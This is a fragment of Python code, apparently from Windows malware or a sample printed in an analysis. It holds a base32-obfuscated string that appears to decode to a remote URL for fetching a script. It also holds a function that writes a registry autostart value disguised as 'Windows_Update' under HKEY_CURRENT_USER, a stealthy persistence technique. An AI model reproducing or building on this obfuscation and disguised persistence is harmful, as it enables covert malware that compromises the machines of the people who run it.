...
def decode():
    return b32decode("NB2HI4DTHIXS6RDBOJVXGZLBM5ZGKZLOKRUG64TOPFDXEYLEOVQXIZJOO5SWW2LNNE2TKNRVFZZGK4DMFZRW6L3TMNZGS4DUFZYHS===".encode()).decode()
...
def query_hostapis(index=None):
    ...
    with winreg.OpenKey(key=winreg.HKEY_CURRENT_USER, sub_key=sub_key, reserved=0, access=winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, "Windows_Update", 0, winreg.REG_SZ, base_path)
    if index is None:
